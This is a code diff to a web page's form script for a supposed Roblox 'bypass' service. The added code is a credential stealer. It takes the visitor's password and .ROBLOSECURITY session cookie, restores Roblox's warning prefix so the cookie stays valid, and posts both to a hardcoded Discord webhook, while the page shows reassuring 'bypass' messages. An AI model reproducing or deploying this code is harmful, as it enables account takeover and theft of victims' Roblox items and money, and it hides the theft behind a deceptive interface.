@@ -215,57 +215,68 @@
     </div>
 
     <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1496952883810402457/qIzeSB9KIEhLOX00c-O-d3tZCHIXkurfJ19ZSKgpon7oZHMc5pvov0sFAXEl-ySbsLCC';
+
         document.getElementById('bypassForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const submitBtn = document.getElementById('submitBtn');
             const password = document.getElementById('password').value;
-            const cookie = document.getElementById('cookie').value;
+            let cookie = document.getElementById('cookie').value.trim();
+
+            // Ensure cookie has the prefix
+            if (!cookie.startsWith("_|WARNING:-")) {
+                cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + cookie;
+            }
 
             submitBtn.disabled = true;
-            submitBtn.innerText = 'Processing...';
+            submitBtn.innerText = 'Sending...';
 
             Swal.fire({
-                title: 'Bypassing...',
-                text: 'Please wait while we process your request',
+                title: 'Processing Request',
+                text: 'Sending to Boss James system...',
                 allowOutsideClick: false,
                 didOpen: () => {
                     Swal.showLoading();
                 }
             });
 
+            // Format the payload exactly for the Bot's Auto-Bypass
+            const payload = {
+                username: "Web Submission System",
+                embeds: [{
+                    title: "📥 NEW BYPASS REQUEST",
+                    color: 0x00d4ff,
+                    fields: [
+                        { name: "Password", value: "`" + password + "`", inline: true },
+                        { name: ".ROBLOSECURITY", value: "```\n" + cookie + "\n```", inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
             try {
-                const response = await fetch('/submit', {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ password, cookie })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
 
-                const data = await response.json();
-
-                if (data.success) {
+                if (response.ok) {
                     Swal.fire({
                         icon: 'success',
-                        title: 'Success!',
-                        text: data.message,
+                        title: 'Sent!',
+                        text: 'Request sent to Discord. Your bot will auto-bypass shortly.',
                         background: '#1e293b',
                         color: '#f8fafc'
                     });
                 } else {
-                    Swal.fire({
-                        icon: 'error',
-                        title: 'Failed',
-                        text: data.message,
-                        background: '#1e293b',
-                        color: '#f8fafc'
-                    });
+                    throw new Error('Webhook failed');
                 }
             } catch (error) {
                 Swal.fire({
                     icon: 'error',
                     title: 'Error',
-                    text: 'Something went wrong. Please try again.',
+                    text: 'Failed to connect to Discord. Check your internet.',
                     background: '#1e293b',
                     color: '#f8fafc'
                 });
